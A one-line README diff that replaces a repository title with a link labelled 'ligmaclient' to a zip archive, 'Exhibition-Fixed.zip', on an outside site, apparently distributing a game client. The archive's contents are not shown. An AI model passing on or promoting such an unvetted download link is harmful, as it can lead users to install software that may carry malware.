@@ -1,1 +1,1 @@
-# Ligma-cpu.github.io
+[ligmaclient](https://minesense.pub/download/Exhibition-Fixed.zip)
